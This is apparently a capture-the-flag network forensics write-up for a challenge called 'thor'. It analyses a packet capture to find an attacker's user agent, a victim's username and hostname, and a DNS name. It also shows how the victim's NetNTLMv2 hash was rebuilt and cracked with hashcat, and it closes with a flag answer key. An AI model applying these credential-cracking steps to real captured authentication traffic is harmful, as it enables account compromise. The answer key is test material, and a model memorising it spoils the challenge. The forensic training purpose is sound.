# thor

## Q1. What is the attacker's user agent?

I started by looking for HTTP traffic inside the capture:
```bash
tshark -r thor.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort -u
```

This revealed a suspicious user agent: `Mozilla/4.08 (Charon; Inferno)`

This user agent appeared in an HTTP POST request:

```http
POST /~zadmin/ap2/mime.php HTTP/1.0
User-Agent: Mozilla/4.08 (Charon; Inferno)
Host: 185.82.202.75
Content-Type: application/octet-stream
```

So the answer is: `SSS{Mozilla/4.08 (Charon; Inferno)}`

## Q2. What is the victim's username and hostname?

The suspicious HTTP POST body contained readable UTF-16LE strings. Inside the stream, the victim information appeared with null bytes between characters:
```text
b.e.n.j.a.m.i.n...f.r.a.n.k.l.i.n
H.I.G.H.A.S.A.K.I.T.E.-.P.C
```

After removing the null bytes, this becomes:
```text
benjamin.franklin
HIGHASAKITE-PC
```

This was also confirmed in the SMB authentication packet:
```text
Session Setup AndX Request, NTLMSSP_AUTH, User: HIGHASAKITE-PC\benjamin.franklin
```

So the answer is: `SSS{benjamin.franklin-HIGHASAKITE-PC}`

## Q3. What NTLM hash did the user authenticate with?

The NTLM authentication happened in frame 10:
```bash
tshark -r thor.pcap -Y 'frame.number == 10' -T fields -e ntlmssp.auth.ntresponse
```

This returned the NTLMv2 response:
```text
b647ea1ca418c2e2ab219c125f3437b30101000000000000df3d044ebf73d30128a7dd562efbd766000000000200100056005000530033003700370035003600010010005600500053003300370037003500360004001c0068006f00730074007300610069006c006f0072002e0063006f006d0003002e00760070007300330037003700350036002e0068006f00730074007300610069006c006f0072002e0063006f006d000800300030000000000000000100000000200000078bd1be22895feca1032d2865519df85a517fe42d581a033bc4121f95aff57a0a001000000000000000000000000000000000000900220063006900660073002f003100380035002e00340035002e003100390032002e0037000000000000000000
```

The server challenge was found in frame 9:
```bash
tshark -r thor.pcap -Y 'ntlmssp.ntlmserverchallenge' -T fields -e frame.number -e ntlmssp.ntlmserverchallenge
```

Output:
```text
9       da20204c8024e7ff
954     aa90271aff0fc5d2
```

Since frame 10 is the authentication packet, the matching challenge is from frame 9: `da20204c8024e7ff`

The NetNTLMv2 hash was built in hashcat format:
```text
benjamin.franklin::HIGHASAKITE-PC:da20204c8024e7ff:b647ea1ca418c2e2ab219c125f3437b3:0101000000000000df3d044ebf73d30128a7dd562efbd766000000000200100056005000530033003700370035003600010010005600500053003300370037003500360004001c0068006f00730074007300610069006c006f0072002e0063006f006d0003002e00760070007300330037003700350036002e0068006f00730074007300610069006c006f0072002e0063006f006d000800300030000000000000000100000000200000078bd1be22895feca1032d2865519df85a517fe42d581a033bc4121f95aff57a0a001000000000000000000000000000000000000900220063006900660073002f003100380035002e00340035002e003100390032002e0037000000000000000000
```

I saved it into `hash.txt` and cracked it with hashcat mode 5600:
```bash
hashcat -m 5600 hash.txt rockyou.txt
hashcat -m 5600 hash.txt rockyou.txt --show
```

Hashcat showed that the password was empty, because the output ended with a final colon and no password after it: `...000000:`

The NTLM hash of an empty password is: `31d6cfe0d16ae931b73c59d7e0c089c0`

So the answer is: `SSS{31d6cfe0d16ae931b73c59d7e0c089c0}`

## Q4. What is the DNS computer name?

The DNS computer name was inside the NTLMv2 target info field from frame 10. In the NTLM response blob, this UTF-16LE value appeared: `760070007300330037003700350036002e0068006f00730074007300610069006c006f0072002e0063006f006d00`

I decoded it using:
```bash
echo '760070007300330037003700350036002e0068006f00730074007300610069006c006f0072002e0063006f006d00' | xxd -r -p | iconv -f UTF-16LE -t UTF-8
```

The decoded DNS computer name was: `vps37756.hostsailor.com`

So the answer is: `SSS{vps37756.hostsailor.com}`

```text
Q1: SSS{Mozilla/4.08 (Charon; Inferno)}
Q2: SSS{benjamin.franklin-HIGHASAKITE-PC}
Q3: SSS{31d6cfe0d16ae931b73c59d7e0c089c0}
Q4: SSS{vps37756.hostsailor.com}
```
